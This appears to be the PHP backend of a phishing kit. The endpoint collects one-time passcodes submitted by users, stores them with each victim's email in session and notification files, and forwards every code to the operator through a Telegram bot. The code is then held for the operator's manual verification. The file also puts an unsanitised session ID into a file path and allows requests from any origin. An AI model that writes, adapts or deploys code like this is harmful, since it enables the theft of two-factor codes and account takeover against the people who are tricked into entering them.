<?php
// Este script maneja el envío del código OTP

// Incluir el bot de Telegram
require_once 'telegram_bot.php';

// Cargar configuración
$config = include 'config.php';
$base_url = $config['base_url'];

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo json_encode(['success' => false, 'message' => 'Método no permitido']);
    exit();
}

// Obtener los datos del POST
$data = json_decode(file_get_contents('php://input'), true);
$session_id = $data['session_id'] ?? '';
$otp_code = $data['otp_code'] ?? '';

if (empty($session_id) || empty($otp_code)) {
    echo json_encode(['success' => false, 'message' => 'Datos incompletos']);
    exit();
}

// Verificar si existe el archivo de sesión
$session_file = __DIR__ . "/sessions/{$session_id}.json";

if (!file_exists($session_file)) {
    echo json_encode(['success' => false, 'message' => 'Sesión no encontrada']);
    exit();
}

// Leer el archivo de sesión
$session_data = json_decode(file_get_contents($session_file), true);

// Actualizar los datos de la sesión
$session_data['otp_code'] = $otp_code;
$session_data['otp_submitted'] = true;
$session_data['otp_verified'] = false; // Inicialmente no verificado, esperando tu confirmación
$session_data['manually_verified'] = false; // Resetear el estado de verificación manual
$session_data['verification_time'] = null; // Resetear el tiempo de verificación
$session_data['updated_at'] = date('Y-m-d H:i:s');

// Guardar los cambios
file_put_contents($session_file, json_encode($session_data, JSON_PRETTY_PRINT));

// Enviar notificación a Telegram
notify_otp_received($session_id, $otp_code);

// Crear un archivo de notificación para el panel de administración
$notifications_dir = __DIR__ . '/notifications';
if (!is_dir($notifications_dir)) {
    mkdir($notifications_dir, 0755, true);
}

// Guardar la notificación
$notification_id = 'notification_' . time() . '_' . substr(md5(uniqid()), 0, 9);
$notification_data = [
    'id' => $notification_id,
    'type' => 'otp_received',
    'email' => $session_data['email'],
    'otp' => $otp_code,
    'session_id' => $session_id,
    'timestamp' => date('c'),
    'read' => false,
    'created_at' => date('Y-m-d H:i:s')
];

$notification_file = $notifications_dir . '/' . $notification_id . '.json';
file_put_contents($notification_file, json_encode($notification_data, JSON_PRETTY_PRINT));

// Devolver respuesta exitosa
echo json_encode([
    'success' => true,
    'message' => 'Código OTP registrado correctamente',
    'verification_status' => 'pending' // Estado pendiente de verificación
]);
?>